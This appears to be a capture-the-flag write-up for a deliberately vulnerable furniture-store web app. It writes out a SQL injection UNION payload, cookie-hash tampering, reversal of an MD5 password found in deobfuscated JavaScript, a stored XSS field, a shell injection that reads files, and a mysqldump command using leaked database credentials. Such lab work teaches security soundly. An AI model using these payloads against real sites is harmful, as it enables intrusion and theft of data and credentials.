# CSB Furniture store

## Product List Token
Investigate the products: Find a SQL injection attack that makes the site display all of the products it has in the database. One of the products that is not normally displayed includes a token, submit this token to the token submission website.

### Methodology
We first need to inspect the form. Submitting the ' character alone shows that the database is mySQL from the error message. Now we test the search function using some common syntax such as "A t" and "A_TA___" and find out that the SQL statement in use is most likely `LIKE BINARY`, since the search is case insensitive and the operators behave as expected. 

Most likely, the query looks like
```
SELECT *
FROM products
WHERE name LIKE BINARY pattern;
```

So we naively try the query: 

```
' UNION SELECT * FROM products #
```

Which gets us the solution. We see the flag on the next page item called My Little Pony.


## Hidden Market Token

### Methodology
Using burp and attempting to sign in, we see that the sign in is done with a simple POST request, sending the credentials in cleartext. There is also a PHP session ID as a cookie.

After logging in to an account, we see that there is an extra cookie. In my case it was 
`040ec1ee950ffc53291f6df0ffc30325=cfcd208495d565ef66e7dff9f98764da`. Looks like a key-value pair, and since they are both 32 bit hex strings, it looks like they might both be MD5 values. (I tried a base64 decoder and only got garbled binary).

I went on a long fucking goose chase to try and use john to reverse the md5 hash, but there is a nice lookup tool on google that revealed the reverse of the two hashes:

040ec1ee950ffc53291f6df0ffc30325 <==> dealer
cfcd208495d565ef66e7dff9f98764da <==> 0

Therefore, we can get the solution by using Burp to replace the second hash string to the md5 hash of '1', which is c4ca4238a0b923820dcc509a6f75849b.

The token is found immediate on the presence of this cookie.

## Admin Page Password Hunt

### Methodology
Visiting the admin page with our spoofed cookie, it prompts us for a password. The page source contains obfuscated code, so lets try seeing what it does. 

```js
var _0x9efc=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x2F\x6A\x73\x2F\x6D\x64\x35\x2E\x6A\x73","\x6F\x6E\x6C\x6F\x61\x64","\x2F\x6A\x73\x2F\x65\x6E\x63\x2D\x62\x61\x73\x65\x36\x34\x2D\x6D\x69\x6E\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x73\x75\x62\x6D\x69\x74","\x76\x61\x6C","\x23\x70\x61\x73\x73\x77\x6F\x72\x64","\x65\x6E\x63","\x65\x32\x30\x37\x37\x64\x38\x37\x38\x33\x32\x37\x30\x32\x36\x63\x33\x63\x63\x34\x65\x33\x35\x61\x36\x65\x37\x30\x33\x37\x64\x37","\x63\x44\x52\x79\x4E\x47\x30\x7A\x4E\x7A\x4E\x79","\x70\x61\x72\x73\x65","\x42\x61\x73\x65\x36\x34","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x2F\x61\x64\x6D\x69\x6E\x2F\x75\x73\x65\x72\x73\x2E\x70\x68\x70\x3F","\x3D","\x6F\x6E","\x23\x6C\x6F\x67\x69\x6E","\x72\x65\x61\x64\x79"];$(document)[_0x9efc[21]](function (){s1=document[_0x9efc[1]](_0x9efc[0]);s1[_0x9efc[2]]=_0x9efc[3];s1[_0x9efc[4]]=function (){s2=document[_0x9efc[1]](_0x9efc[0]);s2[_0x9efc[2]]=_0x9efc[5];document[_0x9efc[7]][_0x9efc[6]](s2);} ;document[_0x9efc[7]][_0x9efc[6]](s1);$(_0x9efc[20])[_0x9efc[19]](_0x9efc[8],function (){v=$(_0x9efc[10])[_0x9efc[9]]();h1=CryptoJS.MD5(v).toString(CryptoJS[_0x9efc[11]].Hex);if(h1==_0x9efc[12]){p=CryptoJS[_0x9efc[11]][_0x9efc[15]][_0x9efc[14]](_0x9efc[13]).toString(CryptoJS[_0x9efc[11]].Latin1);h2=CryptoJS.MD5(v+h1).toString(CryptoJS[_0x9efc[11]].Hex);document[_0x9efc[16]]=_0x9efc[17]+p+_0x9efc[18]+h2;} ;return false;} );} );
```

Running it first through a hex deobfuscator gets us something a bit more readable:

```js
var _0x9efc=["script","createElement","src","/js/md5.js","onload","/js/enc-base64-min.js","appendChild","body","submit","val","#password","enc","e2077d878327026c3cc4e35a6e7037d7","cDRyNG0zNzNy","parse","Base64","location","/admin/users.php?","=","on","#login","ready"];$(document)[_0x9efc[21]](function (){s1=document[_0x9efc[1]](_0x9efc[0]);s1[_0x9efc[2]]=_0x9efc[3];s1[_0x9efc[4]]=function (){s2=document[_0x9efc[1]](_0x9efc[0]);s2[_0x9efc[2]]=_0x9efc[5];document[_0x9efc[7]][_0x9efc[6]](s2);} ;document[_0x9efc[7]][_0x9efc[6]](s1);$(_0x9efc[20])[_0x9efc[19]](_0x9efc[8],function (){v=$(_0x9efc[10])[_0x9efc[9]]();h1=CryptoJS.MD5(v).toString(CryptoJS[_0x9efc[11]].Hex);if(h1==_0x9efc[12]){p=CryptoJS[_0x9efc[11]][_0x9efc[15]][_0x9efc[14]](_0x9efc[13]).toString(CryptoJS[_0x9efc[11]].Latin1);h2=CryptoJS.MD5(v+h1).toString(CryptoJS[_0x9efc[11]].Hex);document[_0x9efc[16]]=_0x9efc[17]+p+_0x9efc[18]+h2;} ;return false;} );} );
```

The wonderful folks behind the [JS beautify project](https://beautifier.io) solve our problem even further:

```js
$(document)['ready'](function() {
    s1 = document['createElement']('script');
    s1['src'] = '/js/md5.js';
    s1['onload'] = function() {
        s2 = document['createElement']('script');
        s2['src'] = '/js/enc-base64-min.js';
        document['body']['appendChild'](s2);
    };
    document['body']['appendChild'](s1);
    $('#login')['on']('submit', function() {
        v = $('#password')['val']();
        h1 = CryptoJS.MD5(v).toString(CryptoJS['enc'].Hex);
        if (h1 == 'e2077d878327026c3cc4e35a6e7037d7') {
            p = CryptoJS['enc']['Base64']['parse']('cDRyNG0zNzNy').toString(CryptoJS['enc'].Latin1);
            h2 = CryptoJS.MD5(v + h1).toString(CryptoJS['enc'].Hex);
            document['location'] = '/admin/users.php?' + p + '=' + h2;
        };
        return false;
    });
});
```

The code has the md5 has of the password in plaintext in the if statement, so a reverse MD5 lookup on the string `e2077d878327026c3cc4e35a6e7037d7` reveals that the password is `monkey95`. The token is now on the admin panel in plaintext.

## Stored XSS Vulnerability
The add products page is the clear answer here: the name and description fields are properly escaped, but the price field is not, so putting the script in there will result in a successful exploit.

## Shell Injection Vulnerability
This is in the file uploads area in the admin panel. It looks like it is doing a simple `ls`, so we simply try `; cat /webtoken` and it works.

## Database Access Token
I got lazy here: The key is to use Burp and some googling to create and spoof a polyglot as a picture with .jpg extension. However, since there was a convenient shell injection, I just used the `cat` command to spit out the source code.

```php
<?php
  // create a connection the database engine
  $db = mysql_connect("127.0.0.1", "csecvm", "H93AtG6akq");
  if(!$db)
    die("Couldn't connect to the MySQL server.");

  // change database
  $use = mysql_select_db("csecvm", $db);
  if(!$use)
    die("Couldn't select database.");
?>
```

From here we can inject further shell code to do:
`; mysqldump --user=csecvm --password=H93AtG6akq --all-databases | grep token`

And the token is right there.